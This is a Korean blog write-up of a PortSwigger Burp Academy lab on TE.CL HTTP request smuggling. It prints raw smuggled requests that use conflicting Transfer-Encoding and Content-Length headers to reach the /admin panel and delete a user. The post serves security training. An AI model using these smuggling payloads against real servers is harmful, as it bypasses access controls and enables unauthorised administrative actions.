---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-17 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/exploiting
- 난이도: PRACTITIONER (보통)

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 백엔드서버는 chunked encoding(TE헤더)를 지원하지 않는다. 
- 프론트엔드서버는 관리자가 아닌경우 `/admin`에 접근하지 못하게 하는 접근 제어를 실시중이다.
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, 관리자 패널(`/admin`)에 접근해 carlos 유저를 삭제하면 된다. 

```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
```

# 풀이 
1. 일단 스머글링되는 기본형을 확인한다. TE.CL이다. 응답을 보면 스머글링이 가능해보이는 것을 알 수 있다. 

![스머글링 가능여부 확인](/images/burp-academy-hrs-7-2.png)


2. 스머글링할 요청(`/admin`)도 정상동작여부를 확인해둔다. 

![스머글링용 요청의 정상 동작 확인](/images/burp-academy-hrs-7-3.png)


3. 그러나 시도해보면 왜인지 400응답이 자꾸 회신된다. 어디가 잘못된 것일까? 

```http
POST / HTTP/1.1
Host: 0a2700550324837e8371aab800f70000.web-security-academy.net
Cookie: session=ojFinuFtlHO5SJpmG8mqCJFSI9a1RNUX
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 5

a=1
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
0


```

![400응답](/images/burp-academy-hrs-7-1.png)

2. 잘 모르겠으므로 답을 본다. 

다음과 같은 해답이 실려있다. 놀랍게도 페이로드 부분의 값이 `60`일 때는 제대로 동작(스머글링 성공)했다. 페이로드 값에 따라 동작이 달라지는 것 같다. 이건 문제가 잘못되었다고 봐야할 것 같다. 

그리고 이유는 모르겠지만 Content-Length의 값도 정확히 10일때는 제대로 동작하지 않았다. 10보다 큰 값일 때는 제대로 동작했다. 

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![admin 패널접근 요청 스머글링 성공](/images/burp-academy-hrs-7-4.png)

3. Host: localhost 헤더를 추가해서 보낸다.  이번에도 해답에 적혀진 것 처럼 페이로드 부분의 값이 71일 때 성공했다...다른 값을 바꾸면 Invalid Request 응답이 돌아온다.😡

![admin 패널접근 성공](/images/burp-academy-hrs-7-5.png)

4. carlos유저를 삭제하는 요청을 보낸다. 성공하면 302응답이 회신되고 문제가 풀렸다는 메세지가 표시된다. 

![carlos유저 삭제](/images/burp-academy-hrs-7-6.png)

![풀이 성공](/images/burp-academy-hrs-7-success.png)

# 감상
문제를 푸는 접근방법은 맞았다. 문제 서버가 응답을 잘 해줬으면 풀었을 것이다. 